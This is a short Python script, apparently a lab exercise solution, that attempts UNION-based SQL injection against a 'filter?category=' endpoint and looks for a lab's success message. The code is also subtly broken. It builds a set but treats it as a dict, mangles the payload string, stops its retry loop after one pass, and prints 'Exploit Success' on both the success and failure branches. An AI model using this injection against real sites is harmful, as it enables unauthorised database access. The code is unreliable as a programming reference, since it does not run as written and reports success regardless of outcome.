import urllib.parse
import requests
import urllib3, urllib.parse
import sys
import time

proxies = {'http' : 'http://127.0.0.1' ,'https' : 'https://127.0.0.1'	}


def sqli_exp(url):
    uri = "filter?category=Pets"
    category = {"category':Pets'UNION SELECT NULL --"}
    encoded_payload = urllib.parse.quote_plus(category)
    r = requests.get(url + uri + encoded_payload, verify=False, proxies=proxies)

    for _ in range(20):  
        if "Congratulations, you solved the lab!" in r.text:
            return True
        else:
            index = 17
            addOn = "NULL, "
            category['category'] = category['category'][:index] + addOn + category['category'][index:]
            encoded_payload = urllib.parse.quote_plus(category)
            r = requests.get(url + uri + encoded_payload, verify=False, proxies=proxies)
            return False


	

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
		
	except:
		print("[-] Syntax Error , Format : %s <url>" )
		print("Example : SQL_1.py example.com  ")

	if sqli_exp(url):
		print("[+] Exploit Success")
	else:
		print("[+] Exploit Success")